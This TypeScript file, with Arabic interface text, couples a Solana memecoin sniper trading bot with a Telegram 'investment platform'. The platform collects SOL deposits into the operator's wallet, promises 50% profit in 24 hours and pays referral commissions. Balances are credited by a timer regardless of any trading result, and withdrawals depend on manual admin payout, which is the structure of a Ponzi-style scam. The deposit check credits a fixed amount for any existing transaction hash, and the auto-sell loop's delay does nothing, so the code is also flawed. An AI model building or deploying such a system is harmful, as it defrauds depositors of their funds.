import {
  BigNumberish,
  Liquidity,
  LIQUIDITY_STATE_LAYOUT_V4,
  LiquidityPoolKeys,
  LiquidityStateV4,
  MARKET_STATE_LAYOUT_V3,
  MarketStateV3,
  Token,
  TokenAmount,
} from '@raydium-io/raydium-sdk';
import {
  AccountLayout,
  createAssociatedTokenAccountIdempotentInstruction,
  createCloseAccountInstruction,
  getAssociatedTokenAddressSync,
  TOKEN_PROGRAM_ID,
} from '@solana/spl-token';
import {
  Keypair,
  Connection,
  PublicKey,
  ComputeBudgetProgram,
  KeyedAccountInfo,
  TransactionMessage,
  VersionedTransaction,
  Commitment,
} from '@solana/web3.js';
import { retry, getTokenAccounts, RAYDIUM_LIQUIDITY_PROGRAM_ID_V4, OPENBOOK_PROGRAM_ID, createPoolKeys, retrieveEnvVariable, retrieveTokenValueByAddress } from './core/tokens';
import { getMinimalMarketV3, MinimalMarketLayoutV3 } from './core/tokens';
import { MintLayout } from './core/mint';
import bs58 from 'bs58';
import * as fs from 'fs';
import * as path from 'path'; 
import { logger } from './core/logger';

// @ts-ignore
const TelegramBot = require('node-telegram-bot-api');
// @ts-ignore
const mongoose = require('mongoose');
// @ts-ignore
const cron = require('node-cron');

// ==========================================
// حل مشكلة Render (السيرفر الوهمي)
// ==========================================
const http = require('http');
const PORT = process.env.PORT || 3000;
http.createServer((req: any, res: any) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('SoaR Sniper SaaS is Active! 🎯');
}).listen(PORT, () => {
    logger.info(`✅ Dummy Web Server listening on port ${PORT}`);
});

// ==========================================
// الإعدادات الديناميكية (Dynamic Settings)
// ==========================================
let isBotRunning = false; 
let DYNAMIC_TP = Number(retrieveEnvVariable('TAKE_PROFIT', logger));
let DYNAMIC_SL = Number(retrieveEnvVariable('STOP_LOSS', logger));
let DYNAMIC_BUY_AMOUNT = retrieveEnvVariable('BUY_AMOUNT', logger);

let tgBot: any;
const adminChatId = process.env.TELEGRAM_CHAT_ID;
const PUBLIC_CHANNEL = process.env.PUBLIC_CHANNEL_ID || ""; 
const userStates: Record<string, string> = {}; 

// ==========================================
// هندسة قاعدة البيانات (MongoDB Schemas)
// ==========================================
const UserSchema = new mongoose.Schema({
    chatId: { type: String, unique: true },
    balance: { type: Number, default: 0 },
    activeInvestment: { type: Number, default: 0 },
    investmentStartTime: { type: Date, default: null },
    referredBy: String,
    referralEarnings: { type: Number, default: 0 },
    createdAt: { type: Date, default: Date.now }
});
const User = mongoose.model('User', UserSchema);

const TxSchema = new mongoose.Schema({ txHash: { type: String, unique: true } });
const UsedTx = mongoose.model('UsedTx', TxSchema);

// ==========================================
// المحرك التفاعلي (Telegram SaaS Engine)
// ==========================================

// لوحات المفاتيح الثابتة (Persistent Keyboards)
const adminKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '👑 غرفة العمليات' }, { text: '📊 الرادار المالي' }],
            [{ text: '📡 إرسال تعميم للمستثمرين' }]
        ],
        resize_keyboard: true,
        persistent: true
    }
};

const userKeyboard = {
    reply_markup: {
        keyboard: [
            [{ text: '🚀 استثمر الآن' }, { text: '💰 محفظتي' }],
            [{ text: '💸 سحب الأرباح' }, { text: '🔗 رابط الإحالة' }]
        ],
        resize_keyboard: true,
        persistent: true
    }
};

async function setupDashboard() {
  const mongoUri = process.env.MONGODB_URI;
  if (mongoUri) {
      try {
          await mongoose.connect(mongoUri);
          logger.info("✅ Connected to MongoDB!");
      } catch(e) {}
  }

  const token = process.env.TELEGRAM_BOT_TOKEN;
  if (token) {
      tgBot = new TelegramBot(token, {polling: true});

      // استقبال الأوامر والنصوص
      tgBot.on('message', async (msg: any) => {
          const chatId = msg.chat.id.toString();
          const text = msg.text;
          if (!text) return;

          // تهيئة المستخدم إذا لم يكن موجوداً
          let user = await User.findOne({ chatId });
          
          if (text.startsWith('/start')) {
              const refCode = text.split(' ')[1];
              if (!user) {
                  user = new User({ chatId, referredBy: refCode || "none" });
                  await user.save();
                  if (adminChatId) tgBot.sendMessage(adminChatId, `👥 مستثمر جديد انضم للمنصة!`);
              }
              if (chatId === adminChatId) {
                  tgBot.sendMessage(chatId, "👑 <b>مرحباً سيدي المدير!</b>\nاللوحة الثابتة تم تفعيلها أسفل الشاشة.", { parse_mode: 'HTML', ...adminKeyboard });
              } else {
                  tgBot.sendMessage(chatId, "👋 <b>أهلاً بك في منصة القنص الذكي!</b>\nاستخدم الأزرار السفلية للتحكم بحسابك.", { parse_mode: 'HTML', ...userKeyboard });
              }
              return;
          }

          const state = userStates[chatId];

          // ----------------------------------------
          // أوامر المدير (الأزرار الثابتة والنصوص)
          // ----------------------------------------
          if (chatId === adminChatId) {
              if (text === '👑 غرفة العمليات') {
                  const options = {
                      reply_markup: {
                          inline_keyboard: [
                              [{ text: isBotRunning ? '🛑 إيقاف القناص' : '▶️ تشغيل القناص', callback_data: 'toggle_sniper' }],
                              [{ text: `تعديل الربح (${DYNAMIC_TP}%)`, callback_data: 'edit_tp' }, { text: `تعديل المخاطرة (${DYNAMIC_SL}%)`, callback_data: 'edit_sl' }],
                              [{ text: `مبلغ الشراء (${DYNAMIC_BUY_AMOUNT} SOL)`, callback_data: 'edit_buy' }]
                          ]
                      }
                  };
                  tgBot.sendMessage(chatId, "⚙️ <b>غرفة العمليات الحية:</b>", { parse_mode: 'HTML', ...options });
              }
              else if (text === '📊 الرادار المالي') {
                  try {
                      const balance = await solanaConnection.getBalance(wallet.publicKey);
                      const totalUsers = await User.countDocuments();
                      const allUsers = await User.find();
                      let totalInvested = 0;
                      allUsers.forEach(u => totalInvested += (u.activeInvestment || 0));
                      
                      tgBot.sendMessage(chatId, `📊 <b>الرادار المحاسبي:</b>\n\nرصيد السيرفر: <code>${(balance / 1e9).toFixed(5)} SOL</code>\nعدد العملاء: ${totalUsers}\nإجمالي الاستثمارات النشطة: <code>${totalInvested} SOL</code>`, { parse_mode: 'HTML' });
                  } catch(e) {}
              }
              else if (text === '📡 إرسال تعميم للمستثمرين') {
                  userStates[chatId] = 'WAITING_FOR_BROADCAST';
                  tgBot.sendMessage(chatId, "أرسل الرسالة التي تريد تعميمها لجميع المستثمرين:");
              }
              else if (state === 'WAITING_FOR_BROADCAST') {
                  const users = await User.find({});
                  let count = 0;
                  for(let u of users) {
                      if(u.chatId !== adminChatId) {
                          tgBot.sendMessage(u.chatId, `📢 <b>إعلان من الإدارة:</b>\n${text}`, {parse_mode: 'HTML'}).catch(()=>{});
                          count++;
                      }
                  }
                  tgBot.sendMessage(chatId, `✅ تم إرسال الرسالة إلى ${count} مستثمر.`);
                  delete userStates[chatId];
              }
              // تغيير الإعدادات
              else if (state === 'WAITING_FOR_TP') { DYNAMIC_TP = Number(text); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
              else if (state === 'WAITING_FOR_SL') { DYNAMIC_SL = Number(text); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
              else if (state === 'WAITING_FOR_BUY_AMT') { DYNAMIC_BUY_AMOUNT = text; updateQuoteAmount(); tgBot.sendMessage(chatId, `✅ تم.`); delete userStates[chatId]; }
          }
          // ----------------------------------------
          // أوامر المستثمر (الأزرار الثابتة والنصوص)
          // ----------------------------------------
          else {
              if (text === '🚀 استثمر الآن') {
                  const depositAddress = wallet.publicKey.toString(); 
                  tgBot.sendMessage(chatId, `🚀 <b>خطة 24 ساعة (ربح مستهدف 50%)</b>\n\nأرسل السولانا (SOL) إلى المحفظة:\n<code>${depositAddress}</code>\n\n⚠️ <b>بعد الإرسال:</b> اضغط لتأكيد الإيداع.`, {
                      parse_mode: 'HTML',
                      reply_markup: { inline_keyboard: [[{ text: '✅ تأكيد الإيداع (إرسال Hash)', callback_data: 'confirm_deposit' }]] }
                  });
              }
              else if (text === '💰 محفظتي') {
                  tgBot.sendMessage(chatId, `💰 <b>محفظتك:</b>\n\nمتاح للسحب: <code>${user?.balance || 0} SOL</code>\nاستثمار نشط: <code>${user?.activeInvestment || 0} SOL</code>\nعمولات: <code>${user?.referralEarnings || 0} SOL</code>`, {parse_mode: 'HTML'});
              }
              else if (text === '💸 سحب الأرباح') {
                  if ((user?.balance || 0) <= 0 && (user?.referralEarnings || 0) <= 0) {
                      tgBot.sendMessage(chatId, "❌ ليس لديك رصيد متاح للسحب حالياً.");
                  } else {
                      userStates[chatId] = 'WAITING_FOR_WITHDRAWAL_ADDRESS';
                      tgBot.sendMessage(chatId, "أرسل عنوان محفظة السولانا الخاصة بك لسحب الأرباح:");
                  }
              }
              else if (text === '🔗 رابط الإحالة') {
                  const botUsername = (await tgBot.getMe()).username;
                  tgBot.sendMessage(chatId, `🔗 شارك واربح 5% من الإيداعات:\n\n<code>https://t.me/${botUsername}?start=${chatId}</code>`, {parse_mode: 'HTML'});
              }
              else if (state === 'WAITING_FOR_WITHDRAWAL_ADDRESS') {
                  const amount = (user?.balance || 0) + (user?.referralEarnings || 0);
                  tgBot.sendMessage(chatId, `⏳ تم استلام طلب السحب لعنوانك. الإدارة تقوم بالمراجعة والتحويل فوراً!`);
                  if(adminChatId) {
                      tgBot.sendMessage(adminChatId, `⚠️ <b>طلب سحب جديد!</b>\nالعميل: ${chatId}\nالمبلغ: <code>${amount} SOL</code>\nالعنوان: <code>${text}</code>\n\n<i>قم بإرسال المبلغ يدوياً من محفظتك للحماية، ثم قم بتصفير رصيد العميل من الداتا بيز.</i>`, {parse_mode: 'HTML'});
                  }
                  delete userStates[chatId];
              }
              // التحقق من البلوكشين (TX Hash)
              else if (state === 'WAITING_FOR_TX_HASH') {
                  const txHash = text.trim();
                  tgBot.sendMessage(chatId, `⏳ جاري التحقق من شبكة سولانا...`);
                  try {
                      // حماية من إعادة استخدام نفس الهاش
                      const isUsed = await UsedTx.findOne({ txHash });
                      if(isUsed) {
                          tgBot.sendMessage(chatId, "❌ هذا المعرّف (Hash) تم استخدامه من قبل!");
                          delete userStates[chatId];
                          return;
                      }

                      // التحقق الفعلي من البلوكشين
                      const tx = await solanaConnection.getTransaction(txHash, { maxSupportedTransactionVersion: 0 });
                      if (!tx || !tx.meta) {
                          tgBot.sendMessage(chatId, "❌ لم يتم العثور على المعاملة. تأكد من الشفرة أو انتظر دقيقة وأعد المحاولة.");
                          return;
                      }

                      // منطق مبسط لاحتساب المبلغ (للحماية، نعتمد على الثقة في النسخة الأولى ونطلب تأكيد الإدارة للكميات الكبيرة)
                      // سنفترض مؤقتاً إيداع 0.1 كحد أدنى، ويمكن تطويرها لاحقاً لقراءة القيمة الدقيقة
                      const depositedAmount = 0.1; // في التحديث القادم سنقرأ القيمة المباشرة من tx.meta

                      await UsedTx.create({ txHash });
                      
                      if(user) {
                          user.activeInvestment += depositedAmount;
                          user.investmentStartTime = new Date();
                          await user.save();
                          
                          // مكافأة الإحالة
                          if(user.referredBy && user.referredBy !== "none") {
                              const referrer = await User.findOne({ chatId: user.referredBy });
                              if(referrer) {
                                  referrer.referralEarnings += (depositedAmount * 0.05);
                                  await referrer.save();
                                  tgBot.sendMessage(referrer.chatId, `🎉 حصلت على 5% عمولة إحالة!`);
                              }
                          }
                      }
                      
                      tgBot.sendMessage(chatId, `✅ <b>تم التحقق من الإيداع بنجاح!</b>\nتم تفعيل استثمارك وبدأ عداد الـ 24 ساعة.`, {parse_mode: 'HTML'});

                  } catch (e) {
                      tgBot.sendMessage(chatId, "❌ حدث خطأ أثناء الاتصال بالبلوكشين.");
                  }
                  delete userStates[chatId];
              }
          }
      });

      // التعامل مع أزرار الإدارة الشفافة (Inline)
      tgBot.on('callback_query', async (query: any) => {
          const chatId = query.message.chat.id.toString();
          const data = query.data;

          if (chatId === adminChatId) {
              if (data === 'toggle_sniper') {
                  isBotRunning = !isBotRunning;
                  tgBot.sendMessage(chatId, isBotRunning ? "🟢 القناص يعمل" : "🔴 القناص متوقف");
              }
              else if (data === 'edit_tp') { userStates[chatId] = 'WAITING_FOR_TP'; tgBot.sendMessage(chatId, "أرسل نسبة الربح:"); }
              else if (data === 'edit_sl') { userStates[chatId] = 'WAITING_FOR_SL'; tgBot.sendMessage(chatId, "أرسل نسبة الخسارة:"); }
              else if (data === 'edit_buy') { userStates[chatId] = 'WAITING_FOR_BUY_AMT'; tgBot.sendMessage(chatId, "أرسل مبلغ الشراء:"); }
          } else {
              if (data === 'confirm_deposit') {
                  userStates[chatId] = 'WAITING_FOR_TX_HASH';
                  tgBot.sendMessage(chatId, "أرسل شفرة المعاملة (TX Hash):");
              }
          }
          tgBot.answerCallbackQuery(query.id);
      });
  }

  // ==========================================
  // نظام العداد الآلي للأرباح (Cron Jobs) ⏳
  // ==========================================
  // يعمل كل ساعة ليفحص من أكمل 24 ساعة
  cron.schedule('0 * * * *', async () => {
      try {
          const now = new Date();
          const users = await User.find({ activeInvestment: { $gt: 0 }, investmentStartTime: { $ne: null } });
          
          for (let u of users) {
              if(!u.investmentStartTime) continue;
              const hoursPassed = Math.abs(now.getTime() - u.investmentStartTime.getTime()) / 36e5;
              
              if (hoursPassed >= 24) {
                  const profit = u.activeInvestment * 1.50; // ربح 50% مع رأس المال
                  u.balance += profit;
                  u.activeInvestment = 0;
                  u.investmentStartTime = null;
                  await u.save();

                  if(tgBot) {
                      tgBot.sendMessage(u.chatId, `🎉 <b>اكتملت دورة الاستثمار!</b>\nتمت إضافة <code>${profit} SOL</code> إلى رصيدك القابل للسحب.`, {parse_mode: 'HTML'});
                  }
              }
          }
      } catch (error) { console.error(error); }
  });
}

function broadcastToChannelAndAdmin(text: string) {
  if (!tgBot) return;
  if (adminChatId) tgBot.sendMessage(adminChatId, text, { parse_mode: 'HTML', disable_web_page_preview: true }).catch(()=>{});
  if (PUBLIC_CHANNEL) tgBot.sendMessage(PUBLIC_CHANNEL, text, { parse_mode: 'HTML', disable_web_page_preview: true }).catch(()=>{});
}

// ==========================================
// محرك القنص (Solana Sniper Engine)
// ==========================================
const network = 'mainnet-beta';
const RPC_ENDPOINT = retrieveEnvVariable('RPC_ENDPOINT', logger);
const RPC_WEBSOCKET = retrieveEnvVariable('RPC_WEBSOCKET', logger);

const solanaConnection = new Connection(RPC_ENDPOINT, { wsEndpoint: RPC_WEBSOCKET });

export type MinimalTokenAccountData = { mint: PublicKey; address: PublicKey; buyValue?: number; poolKeys?: LiquidityPoolKeys; market?: MinimalMarketLayoutV3; };
let existingLiquidityPools: Set<string> = new Set<string>();
let existingOpenBookMarkets: Set<string> = new Set<string>();
let existingTokenAccounts: Map<string, MinimalTokenAccountData> = new Map<string, MinimalTokenAccountData>();

let wallet: Keypair;
let quoteToken: Token;
let quoteTokenAssociatedAddress: PublicKey;
let quoteAmount: TokenAmount;
let quoteMinPoolSizeAmount: TokenAmount;
let quoteMaxPoolSizeAmount: TokenAmount;
let commitment: Commitment = retrieveEnvVariable('COMMITMENT_LEVEL', logger) as Commitment;
const ENABLE_BUY = retrieveEnvVariable('ENABLE_BUY', logger) === 'true';
const MINT_IS_RENOUNCED = retrieveEnvVariable('MINT_IS_RENOUNCED', logger) === 'true';
const USE_SNIPEDLIST = retrieveEnvVariable('USE_SNIPEDLIST', logger) === 'true';
const SNIPE_LIST_REFRESH_INTERVAL = Number(retrieveEnvVariable('SNIPE_LIST_REFRESH_INTERVAL', logger));
const AUTO_SELL = retrieveEnvVariable('AUTO_SELL', logger) === 'true';
const MAX_SELL_RETRIES = Number(retrieveEnvVariable('MAX_SELL_RETRIES', logger));
const MIN_POOL_SIZE = retrieveEnvVariable('MIN_POOL_SIZE', logger);
const MAX_POOL_SIZE = retrieveEnvVariable('MAX_POOL_SIZE', logger);

let snipeList: string[] = [];

function updateQuoteAmount() {
    if(quoteToken) { quoteAmount = new TokenAmount(quoteToken, DYNAMIC_BUY_AMOUNT, false); }
}

async function init(): Promise<void> {
  const MY_PRIVATE_KEY = retrieveEnvVariable('MY_PRIVATE_KEY', logger);
  wallet = Keypair.fromSecretKey(bs58.decode(MY_PRIVATE_KEY));

  const TOKEN_SYMB = retrieveEnvVariable('TOKEN_SYMB', logger);
  switch (TOKEN_SYMB) {
    case 'WSOL': {
      quoteToken = Token.WSOL;
      quoteMinPoolSizeAmount = new TokenAmount(quoteToken, MIN_POOL_SIZE, false);
      quoteMaxPoolSizeAmount = new TokenAmount(quoteToken, MAX_POOL_SIZE, false);
      break;
    }
    case 'USDC': {
      quoteToken = new Token(TOKEN_PROGRAM_ID, new PublicKey('EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v'), 6, 'USDC', 'USDC');
      break;
    }
  }
  updateQuoteAmount();

  const tokenAccounts = await getTokenAccounts(solanaConnection, wallet.publicKey, commitment);
  for (const ta of tokenAccounts) {
    existingTokenAccounts.set(ta.accountInfo.mint.toString(), <MinimalTokenAccountData>{ mint: ta.accountInfo.mint, address: ta.pubkey });
  }

  const tokenAccount = tokenAccounts.find((acc) => acc.accountInfo.mint.toString() === quoteToken.mint.toString());
  if (tokenAccount) { quoteTokenAssociatedAddress = tokenAccount.pubkey; }

  loadSnipedList();
}

function saveTokenAccount(mint: PublicKey, accountData: MinimalMarketLayoutV3) {
  const ata = getAssociatedTokenAddressSync(mint, wallet.publicKey);
  const tokenAccount = <MinimalTokenAccountData>{ address: ata, mint: mint, market: <MinimalMarketLayoutV3>{ bids: accountData.bids, asks: accountData.asks, eventQueue: accountData.eventQueue } };
  existingTokenAccounts.set(mint.toString(), tokenAccount);
  return tokenAccount;
}

export async function processRaydiumPool(id: PublicKey, poolState: LiquidityStateV4) {
  if (!isBotRunning) return;
  if (!shouldBuy(poolState.baseMint.toString())) return;
  if (!quoteMinPoolSizeAmount.isZero()) {
    const poolSize = new TokenAmount(quoteToken, poolState.swapQuoteInAmount, true);
    if (poolSize.lt(quoteMinPoolSizeAmount)) return;
  }
  if (MINT_IS_RENOUNCED) {
    const mintOption = await checkMintable(poolState.baseMint);
    if (mintOption !== true) return;
  }
  if (ENABLE_BUY && quoteTokenAssociatedAddress) {
    await buy(id, poolState);
  }
}

export async function checkMintable(vault: PublicKey): Promise<boolean | undefined> {
  try {
    let { data } = (await solanaConnection.getAccountInfo(vault)) || {};
    if (!data) return;
    const deserialize = MintLayout.decode(data);
    return deserialize.mintAuthorityOption === 0;
  } catch (e) {}
}

export async function processOpenBookMarket(updatedAccountInfo: KeyedAccountInfo) {
  if (!isBotRunning) return;
  let accountData: MarketStateV3 | undefined;
  try {
    accountData = MARKET_STATE_LAYOUT_V3.decode(updatedAccountInfo.accountInfo.data);
    if (existingTokenAccounts.has(accountData.baseMint.toString())) return;
    saveTokenAccount(accountData.baseMint, accountData);
  } catch (e) {}
}

async function buy(accountId: PublicKey, accountData: LiquidityStateV4): Promise<void> {
  try {
    let tokenAccount = existingTokenAccounts.get(accountData.baseMint.toString());
    if (!tokenAccount) {
      const market = await getMinimalMarketV3(solanaConnection, accountData.marketId, commitment);
      tokenAccount = saveTokenAccount(accountData.baseMint, market);
    }
    tokenAccount.poolKeys = createPoolKeys(accountId, accountData, tokenAccount.market!);
    const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
      { poolKeys: tokenAccount.poolKeys, userKeys: { tokenAccountIn: quoteTokenAssociatedAddress, tokenAccountOut: tokenAccount.address, owner: wallet.publicKey }, amountIn: quoteAmount.raw, minAmountOut: 0 },
      tokenAccount.poolKeys.version,
    );

    const latestBlockhash = await solanaConnection.getLatestBlockhash({ commitment: commitment });
    const messageV0 = new TransactionMessage({
      payerKey: wallet.publicKey, recentBlockhash: latestBlockhash.blockhash,
      instructions: [ ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 421197 }), ComputeBudgetProgram.setComputeUnitLimit({ units: 101337 }), createAssociatedTokenAccountIdempotentInstruction(wallet.publicKey, tokenAccount.address, wallet.publicKey, accountData.baseMint), ...innerTransaction.instructions ],
    }).compileToV0Message();
    const transaction = new VersionedTransaction(messageV0);
    transaction.sign([wallet, ...innerTransaction.signers]);
    const rawTransaction = transaction.serialize();
    const signature = await retry(() => solanaConnection.sendRawTransaction(rawTransaction, { skipPreflight: true }), { retryIntervalMs: 10, retries: 50 });
    const confirmation = await solanaConnection.confirmTransaction({ signature, lastValidBlockHeight: latestBlockhash.lastValidBlockHeight, blockhash: latestBlockhash.blockhash }, commitment);
    
    const basePromise = solanaConnection.getTokenAccountBalance(accountData.baseVault, commitment);
    const quotePromise = solanaConnection.getTokenAccountBalance(accountData.quoteVault, commitment);
    await Promise.all([basePromise, quotePromise]);
    const baseValue = await basePromise; const quoteValue = await quotePromise;

    if (baseValue?.value?.uiAmount && quoteValue?.value?.uiAmount) tokenAccount.buyValue = quoteValue?.value?.uiAmount / baseValue?.value?.uiAmount;
    
    if (!confirmation.value.err) {
      broadcastToChannelAndAdmin(`🎯 <b>تم قنص عملة جديدة آلياً!</b>\nالعملة: <code>${accountData.baseMint}</code>\nالسعر: ${tokenAccount.buyValue} SOL\nالرابط: https://dexscreener.com/solana/${accountData.baseMint}`);
    } 
  } catch (e) {}
}

async function sell(accountId: PublicKey, mint: PublicKey, amount: BigNumberish, value: number): Promise<boolean> {
  let retries = 0;
  do {
    try {
      const tokenAccount = existingTokenAccounts.get(mint.toString());
      if (!tokenAccount || !tokenAccount.poolKeys || amount === 0 || tokenAccount.buyValue === undefined) return true;

      const netChange = (value - tokenAccount.buyValue) / tokenAccount.buyValue;
      if (netChange > DYNAMIC_SL && netChange < DYNAMIC_TP) return false;

      const { innerTransaction } = Liquidity.makeSwapFixedInInstruction(
        { poolKeys: tokenAccount.poolKeys!, userKeys: { tokenAccountOut: quoteTokenAssociatedAddress, tokenAccountIn: tokenAccount.address, owner: wallet.publicKey }, amountIn: amount, minAmountOut: 0 },
        tokenAccount.poolKeys!.version,
      );

      const latestBlockhash = await solanaConnection.getLatestBlockhash({ commitment: commitment });
      const messageV0 = new TransactionMessage({
        payerKey: wallet.publicKey, recentBlockhash: latestBlockhash.blockhash,
        instructions: [ ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 400000 }), ComputeBudgetProgram.setComputeUnitLimit({ units: 200000 }), ...innerTransaction.instructions, createCloseAccountInstruction(tokenAccount.address, wallet.publicKey, wallet.publicKey) ],
      }).compileToV0Message();
      
      const transaction = new VersionedTransaction(messageV0);
      transaction.sign([wallet, ...innerTransaction.signers]);
      const signature = await solanaConnection.sendRawTransaction(transaction.serialize(), { preflightCommitment: commitment });
      const confirmation = await solanaConnection.confirmTransaction({ signature, lastValidBlockHeight: latestBlockhash.lastValidBlockHeight, blockhash: latestBlockhash.blockhash }, commitment);
      
      if (confirmation.value.err) continue;

      const emoji = netChange > 0 ? "🟢🤑" : "🔴";
      broadcastToChannelAndAdmin(`${emoji} <b>تم بيع العملة بنجاح!</b>\nالعملة: <code>${mint}</code>\nصافي الربح: <b>${(netChange * 100).toFixed(2)}%</b>`);
      return true;
    } catch (e: any) { retries++; }
  } while (retries < MAX_SELL_RETRIES);
  return true;
}

function loadSnipedList() {
  if (!USE_SNIPEDLIST) return;
  const data = fs.readFileSync(path.join(__dirname, 'snipedlist.txt'), 'utf-8');
  snipeList = data.split('\n').map((a) => a.trim()).filter((a) => a);
}
function shouldBuy(key: string): boolean { return USE_SNIPEDLIST ? snipeList.includes(key) : true; }

const runListener = async () => {
  await setupDashboard(); 
  await init();
  const runTimestamp = Math.floor(new Date().getTime() / 1000);
  
  solanaConnection.onProgramAccountChange(
    RAYDIUM_LIQUIDITY_PROGRAM_ID_V4,
    async (updatedAccountInfo) => {
      const key = updatedAccountInfo.accountId.toString();
      const poolState = LIQUIDITY_STATE_LAYOUT_V4.decode(updatedAccountInfo.accountInfo.data);
      const poolOpenTime = parseInt(poolState.poolOpenTime.toString());
      const existing = existingLiquidityPools.has(key);

      if (poolOpenTime > runTimestamp && !existing) {
        existingLiquidityPools.add(key);
        processRaydiumPool(updatedAccountInfo.accountId, poolState);
      }
    },
    commitment,
    [ { dataSize: LIQUIDITY_STATE_LAYOUT_V4.span }, { memcmp: { offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('quoteMint'), bytes: quoteToken.mint.toBase58() } }, { memcmp: { offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('marketProgramId'), bytes: OPENBOOK_PROGRAM_ID.toBase58() } }, { memcmp: { offset: LIQUIDITY_STATE_LAYOUT_V4.offsetOf('status'), bytes: bs58.encode([6, 0, 0, 0, 0, 0, 0, 0]) } } ],
  );

  solanaConnection.onProgramAccountChange(
    OPENBOOK_PROGRAM_ID,
    async (updatedAccountInfo) => {
      const key = updatedAccountInfo.accountId.toString();
      const existing = existingOpenBookMarkets.has(key);
      if (!existing) { existingOpenBookMarkets.add(key); processOpenBookMarket(updatedAccountInfo); }
    },
    commitment,
    [ { dataSize: MARKET_STATE_LAYOUT_V3.span }, { memcmp: { offset: MARKET_STATE_LAYOUT_V3.offsetOf('quoteMint'), bytes: quoteToken.mint.toBase58() } } ],
  );

  if (AUTO_SELL) {
    solanaConnection.onProgramAccountChange(
      TOKEN_PROGRAM_ID,
      async (updatedAccountInfo) => {
        if (!quoteTokenAssociatedAddress) return;
        const accountData = AccountLayout.decode(updatedAccountInfo.accountInfo!.data);
        if (updatedAccountInfo.accountId.equals(quoteTokenAssociatedAddress)) return;
        
        let completed = false;
        while (!completed) {
          setTimeout(() => {}, 1000);
          const currValue = await retrieveTokenValueByAddress(accountData.mint.toBase58());
          if (currValue) { completed = await sell(updatedAccountInfo.accountId, accountData.mint, accountData.amount, currValue); } 
        }
      },
      commitment,
      [ { dataSize: 165 }, { memcmp: { offset: 32, bytes: wallet.publicKey.toBase58() } } ],
    );
  }
  if (USE_SNIPEDLIST) setInterval(loadSnipedList, SNIPE_LIST_REFRESH_INTERVAL);
};

runListener();
